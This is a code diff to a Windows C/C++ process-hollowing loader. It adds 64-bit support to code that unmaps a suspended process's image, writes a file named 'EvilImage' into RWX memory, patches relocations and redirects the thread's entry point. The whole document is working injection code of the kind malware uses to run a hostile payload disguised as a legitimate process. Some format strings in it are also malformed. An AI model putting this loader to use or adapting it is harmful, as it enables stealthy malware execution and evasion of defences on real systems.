@@ -43,7 +43,7 @@ int main(int argc, char *argv[]) {
 	// Get All The Register Values
 	printf("Geting Current Context.\n");
 	LPCONTEXT pContext = new CONTEXT();
-	pContext->ContextFlags = CONTEXT_INTEGER;
+	pContext->ContextFlags = CONTEXT_FULL;
 	if (!GetThreadContext(proc_info.hThread, pContext)) {
 		printf("Error getting context\n");
 		return 0;
@@ -52,8 +52,14 @@ int main(int argc, char *argv[]) {
 
 	// Get The Base Address Of The Susspended Process
 	PVOID BaseAddress;
-	ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &BaseAddress, sizeof(PVOID), NULL);
 
+	#ifdef _X86_ 
+		ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &BaseAddress, sizeof(PVOID), NULL);
+	#endif
+
+	#ifdef _WIN64
+		ReadProcessMemory(proc_info.hProcess, (PVOID)(pContext->Rdx + (sizeof(SIZE_T) * 2)), &BaseAddress, sizeof(PVOID), NULL);
+	#endif
 
 	// Getting The Addres Of NtUnmapViewOfSection And unmmaping All the Sections
 	printf("Unmapping Section.\n");
@@ -71,17 +77,26 @@ int main(int argc, char *argv[]) {
 	PIMAGE_NT_HEADERS nt_head = (PIMAGE_NT_HEADERS)((LPBYTE)EvilImage + dos_head->e_lfanew);
 
 
-	// Allocaation Memory In the Susspended Process
+	// Allocaation Memory In the Susspended Process;
 	PVOID mem = VirtualAllocEx(proc_info.hProcess, BaseAddress, nt_head->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	#ifdef _X86_
+		// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
+		DWORD BaseOffset = (DWORD)BaseAddress - nt_head->OptionalHeader.ImageBase;
+		printf("Original Process Base: 0x%llx\nEvil File Base: 0x%llx\nOffset: 0x%llx\n\n", nt_head->OptionalHeader.ImageBase, BaseAddress, BaseOffset);
 
-	// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
-	DWORD BaseOffset = (DWORD)BaseAddress - nt_head->OptionalHeader.ImageBase;
-	printf("Original Process Base: 0x%p\nEvil File Base: 0x%p\nOffset: 0x%p\n\n", nt_head->OptionalHeader.ImageBase, BaseAddress, BaseOffset);
+
+		// Change The Files Base Address To The Base Address Of The Susspended Process
+		nt_head->OptionalHeader.ImageBase = (DWORD)BaseAddress;
+	#endif
+	#ifdef _WIN64
+		// Calculate The Offset Of The Susspended Process Base Address From The Files Base Address
+		DWORD64 BaseOffset = (DWORD64)BaseAddress - nt_head->OptionalHeader.ImageBase;
+		printf("Original Process Base: 0x%llx\nEvil File Base: 0x%llx\nOffset: 0x%llx\n\n", nt_head->OptionalHeader.ImageBase, BaseAddress, BaseOffset);
 
 
-	// Change The Files Base Address To The Base Address Of The Susspended Process
-	nt_head->OptionalHeader.ImageBase = (DWORD)BaseAddress;
-
+		// Change The Files Base Address To The Base Address Of The Susspended Process
+		nt_head->OptionalHeader.ImageBase = (DWORD64)BaseAddress;
+	#endif
 	// Write The Files Headers To The Allocated Memory In The Susspended Process
 	if(!WriteProcessMemory(proc_info.hProcess, BaseAddress, EvilImage, nt_head->OptionalHeader.SizeOfHeaders, 0)){
 		printf("Failed to write Headers\n");
@@ -97,10 +112,10 @@ int main(int argc, char *argv[]) {
 	{
 		// Get The Head Of the Current Section
 		sec_head = (PIMAGE_SECTION_HEADER)((LPBYTE)EvilImage + dos_head->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
-		printf("0x%x -- Writing Section: %s\n", (LPBYTE)mem + sec_head->VirtualAddress, sec_head->Name);
+		printf("0x%lx -- Writing Section: %s\n", (LPBYTE)mem + sec_head->VirtualAddress, sec_head->Name);
 		// Write The section From The File In the Allocated Memory
 		if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((LPBYTE)mem + sec_head->VirtualAddress), (PVOID)((LPBYTE)EvilImage + sec_head->PointerToRawData), sec_head->SizeOfRawData, NULL)) {
-			printf("Error Wriring section: %s. At: %x%p\n", sec_head->Name, (LPBYTE)mem + sec_head->VirtualAddress);
+			printf("Error Wriring section: %s. At: %x%llp\n", sec_head->Name, (LPBYTE)mem + sec_head->VirtualAddress);
 		}
 	}
 
@@ -154,29 +169,52 @@ int main(int argc, char *argv[]) {
 
 					// Resolve The Adderss Of The Reloc
 					DWORD FieldAddress = pBlockHeader->PageAddress + pBlocks[x].Offset;
-
+					
+					#ifdef _X86_
 					// Read The Value In That Address
 					DWORD EnrtyAddress = 0;
-					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(DWORD), 0);
+					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0);
+					printf("0x%llx --> 0x%llx | At:0x%llx\n", EnrtyAddress, EnrtyAddress + BaseOffset, (PVOID)((DWORD)BaseAddress + FieldAddress));
 
-					printf("0x%x --> 0x%x | At:0x%x\n", EnrtyAddress, EnrtyAddress + BaseOffset,(PVOID)((DWORD)BaseAddress + FieldAddress));
+					// Add The Correct Offset To That Address And Write It
+					EnrtyAddress += BaseOffset;
+					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0)) {
+						printf("Error Writing Entry.\n");
+					}
+					#endif
+					#ifdef _WIN64
+					// Read The Value In That Address
+					DWORD64 EnrtyAddress = 0;
+					ReadProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0);
+					printf("0x%llx --> 0x%llx | At:0x%llx\n", EnrtyAddress, EnrtyAddress + BaseOffset,(PVOID)((DWORD64)BaseAddress + FieldAddress));
 					
 					// Add The Correct Offset To That Address And Write It
 					EnrtyAddress += BaseOffset;
-					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(DWORD), 0)){
-						printf("Error Writing Entry.");
+					if (!WriteProcessMemory(proc_info.hProcess, (PVOID)((DWORD64)BaseAddress + FieldAddress), &EnrtyAddress, sizeof(PVOID), 0)){
+						printf("Error Writing Entry.\n");
 					}
+					#endif
 				}
 			}
 		}
 	}
 
-	// Write The New Image Base Address
-	WriteProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &nt_head->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+	#ifdef _X86_
+		// Write The New Image Base Address
+		WriteProcessMemory(proc_info.hProcess, (PVOID)(pContext->Ebx + 8), &nt_head->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
 
-	// Write The New Entrypoint
-	DWORD EntryPoint = (DWORD)((LPBYTE)mem + nt_head->OptionalHeader.AddressOfEntryPoint);
-	pContext->Eax = EntryPoint;
+		// Write The New Entrypoint
+		DWORD EntryPoint = (DWORD)((LPBYTE)mem + nt_head->OptionalHeader.AddressOfEntryPoint);
+		pContext->Eax = EntryPoint;
+	#endif
+	#ifdef _WIN64
+			// Write The New Image Base Address
+			WriteProcessMemory(proc_info.hProcess, (PVOID)(pContext->Rdx + (sizeof(SIZE_T) * 2)), &nt_head->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+
+			// Write The New Entrypoint
+			DWORD64 EntryPoint = (DWORD64)((LPBYTE)mem + nt_head->OptionalHeader.AddressOfEntryPoint);
+			pContext->Rcx = EntryPoint;
+	#endif
 
 	printf("\nSetting Thread Context.\n");
 	if (!SetThreadContext(proc_info.hThread, pContext)){
